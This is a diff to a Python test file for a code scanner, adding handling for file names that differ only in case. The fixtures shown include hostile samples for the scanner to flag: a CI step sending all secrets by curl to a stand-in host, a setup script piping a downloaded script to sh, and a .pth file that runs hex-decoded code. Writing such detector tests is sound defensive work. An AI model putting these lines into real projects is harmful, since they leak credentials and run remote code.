@@ -33,6 +33,7 @@ import unittest
 
 from lazaret.scanner import core
 from tests import _support
+from tests._folding_disk import tells_names_apart
 from tests.scanner import _dashboard_vm as dash
 
 #: the trees of the fixture projects the CLI's walk prunes (core.OPTIN_SKIP_DIRS, dot-directories), left out here
@@ -135,7 +136,7 @@ FOLDERS = [
     ("nested", [("a/b/c/d.py", "import os\nos.system(input())\n"), ("a/b/package.json", _HOOK),
                 ("a/b/hook.pth", b"import os; exec(bytes.fromhex('7072696e74283129').decode())\n"),
                 ("a/.env", f"STRIPE_KEY=sk_live_{SECRET}\n"), ("a/b/c/\u00e9t\u00e9.js", "eval(q)\n"),
-                ("z.py", "eval(w)\n"), ("Z.py", "exec(w)\n"), ("_.py", "x = 2\n")]),
+                ("y.py", "eval(w)\n"), ("Z.py", "exec(w)\n"), ("_.py", "x = 2\n")]),
     ("ci files and settings, by their paths", [
         (".github/workflows/ci.yml", "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                                      "      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n"),
@@ -144,6 +145,11 @@ FOLDERS = [
                                ' "runOptions": {"runOn": "folderOpen"}}]}\n'),
         ("setup.js", "require('child_process').exec('curl -s https://x.invalid/i | sh');\n")]),
 ]
+
+#: a file beside one whose name differs only in case (the "nested" tree's until MAC-TESTS): a disk that tells the names
+#: apart holds both, and the page and the CLI read both, by code point; macOS's and Windows' disks hold one file, so
+#: this tree is uploaded only where the disk holds both (FolderTests)
+CASE_TWINS = [("z.py", "eval(w)\n"), ("Z.py", "exec(w)\n"), ("_.py", "x = 2\n")]
 
 
 @dash.requires_node
@@ -234,6 +240,9 @@ class FolderTests(unittest.TestCase):
     def setUpClass(cls):
         cls.folders = [(name, os.path.join(_support.FIXTURES, name), dash.tree_files(os.path.join(_support.FIXTURES, name)))
                        for name, _ in fixture_projects() if name != "fixtures"] + [(n, None, f) for n, f in FOLDERS]
+        cls.apart = tells_names_apart(tempfile.gettempdir())             # (where dash.cli_result writes the files)
+        if cls.apart:
+            cls.folders.append(("case twins", None, CASE_TWINS))
         cls.pages = dash.run([dash.folder_request(files) for _, _, files in cls.folders], timeout=40)
 
     same = ParityTests.same
@@ -261,7 +270,16 @@ class FolderTests(unittest.TestCase):
             self.assertEqual([i["file"] for i in pages[name]["issues"] if i["rule"] == "Q-SKIPPED-TREE"], ["vendor"])
         self.assertEqual(pages[".git and the opt-in trees"]["files"],   # (.git never; the rest unless excluded)
                          [".hidden/x.py", "build/x.py", "dist/bundle.js", "migrations/0001_initial.py", "src/ok.py"])
-        self.assertEqual(pages["nested"]["files"][:2], ["Z.py", "_.py"])            # (by code point, as the CLI)
+        # (by code point, as the CLI: Z before _ before a and y. A z.py beside the Z.py, as this tree once had, is one
+        # file on macOS's and Windows' disks: the CLI's folder there held four files where the page was given five)
+        self.assertEqual(pages["nested"]["files"][:2], ["Z.py", "_.py"])
+
+    def test_names_that_differ_only_in_case(self):
+        if not self.apart:
+            self.skipTest("this disk holds z.py and Z.py as one file (macOS's and Windows' do)")
+        page = dict(zip([n for n, _, _ in self.folders], self.pages))["case twins"]
+        self.assertEqual(page["files"], ["Z.py", "_.py", "z.py"])          # (compared with the CLI's in test_folders)
+        self.assertEqual(sorted(i["file"] for i in page["issues"] if i["rule"].startswith("S-")), ["Z.py", "z.py"])
 
     def test_a_file_that_cannot_be_read(self):
         files = [("a.py", "eval(x)\n"), ("b/c.py", "x = 1\n")]
